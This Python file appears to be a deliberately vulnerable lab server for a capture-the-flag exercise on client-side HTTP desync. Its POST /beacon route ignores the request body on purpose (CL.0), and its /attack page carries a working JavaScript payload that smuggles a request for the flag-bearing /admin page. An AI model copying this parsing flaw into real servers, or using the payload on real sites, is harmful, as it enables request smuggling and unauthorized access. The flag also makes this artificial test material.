"""Single-tier CL.0 server for the CLIENT-SIDE desync lab (class 4).

Client-side desync needs NO reverse proxy: the BROWSER reuses one keep-alive TCP
connection, so a CL.0 server (one that answers a POST without reading its body) lets a
request smuggled in the POST body poison the browser's OWN next navigation on that
connection.

This server:
  - GET  /            landing page (NO flag) -- the normal navigation result
  - GET  /admin       the flag -- what a poisoned navigation returns instead of /
  - POST /beacon      CL.0: answers 200 WITHOUT reading the body (a fire-and-forget
                      telemetry beacon), leaving the body as the next request
  - GET  /attack      a self-contained attacker page that fetch()-POSTs a smuggled
                      GET /admin to /beacon, then navigates to / on the reused
                      connection (for a browser-only manual repro)

Raw socket server, HTTP/1.1 keep-alive. Generic vulnerable-lab origin.
"""

import os
import re
import socket
import threading

HOST = "0.0.0.0"
PORT = int(os.environ.get("PORT", "5000"))
FLAG = os.environ.get("HRS_FLAG", "REDAMON_HRS{client_side_desync_browser_conn_reuse}")

LANDING = (
    "<!doctype html><html><head><title>Home</title></head><body><h1>Home</h1>"
    "<p>Public site. Nothing sensitive here.</p></body></html>"
)
ADMIN_BODY = (
    "<!doctype html><html><head><title>Admin Console</title></head>"
    "<body><h1>Admin Console (internal)</h1>"
    "<p>A normal navigation to / should never return this page. If your browser's own "
    "navigation returned it, your connection was desynced by the CL.0 /beacon.</p>"
    f"<p>FLAG: {FLAG}</p></body></html>"
)
# A browser-only manual repro: POST a smuggled GET /admin to the CL.0 beacon, then
# navigate to / on the reused connection.
ATTACK_PAGE = (
    "<!doctype html><html><head><title>attack</title></head><body><h1>repro</h1>"
    "<script>\n"
    "(async () => {\n"
    "  const smuggled = 'GET /admin HTTP/1.1\\r\\nHost: ' + location.host + '\\r\\n\\r\\n';\n"
    "  await fetch('/beacon', {method:'POST', body: smuggled, headers:{'Content-Type':'text/plain'}, keepalive:false});\n"
    "  location.href = '/';\n"
    "})();\n"
    "</script></body></html>"
)


def _resp(status_line, body):
    body_bytes = body.encode() if isinstance(body, str) else body
    headers = [
        status_line, "Server: clientside-lab", "X-Server: single-tier",
        "Content-Type: text/html; charset=utf-8",
        f"Content-Length: {len(body_bytes)}", "Connection: keep-alive",
    ]
    return ("\r\n".join(headers) + "\r\n\r\n").encode() + body_bytes


def _read_headers(buf, conn):
    while b"\r\n\r\n" not in buf:
        c = conn.recv(4096)
        if not c:
            return None, buf
        buf += c
    head, _, rest = buf.partition(b"\r\n\r\n")
    return head + b"\r\n\r\n", rest


def _content_length(head):
    for line in head.split(b"\r\n")[1:]:
        if re.match(rb"(?i)^content-length\s*:", line):
            try:
                return int(line.split(b":", 1)[1].strip())
            except ValueError:
                return 0
    return 0


def handle(conn, addr):
    leftover = b""
    try:
        while True:
            head, rest = _read_headers(leftover, conn)
            if head is None:
                return
            parts = head.split(b"\r\n", 1)[0].decode("latin-1", "replace").split(" ")
            method = parts[0] if parts else "GET"
            path = parts[1] if len(parts) > 1 else "/"

            if method == "POST" and path.startswith("/beacon"):
                # CL.0: answer WITHOUT reading the body -> body becomes the next request
                leftover = rest
                conn.sendall(_resp("HTTP/1.1 204 No Content", ""))
                continue

            # everything else reads its Content-Length body normally
            length = _content_length(head)
            buf = rest
            while len(buf) < length:
                c = conn.recv(4096)
                if not c:
                    break
                buf += c
            leftover = buf[length:]

            if path.startswith("/admin"):
                conn.sendall(_resp("HTTP/1.1 200 OK", ADMIN_BODY))
            elif path.startswith("/attack"):
                conn.sendall(_resp("HTTP/1.1 200 OK", ATTACK_PAGE))
            else:
                conn.sendall(_resp("HTTP/1.1 200 OK", LANDING))
    except (ConnectionError, OSError):
        return
    finally:
        try:
            conn.close()
        except OSError:
            pass


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, PORT))
    srv.listen(128)
    print(f"[server] client-side CL.0 on {HOST}:{PORT} (POST /beacon ignores body)", flush=True)
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=handle, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    main()
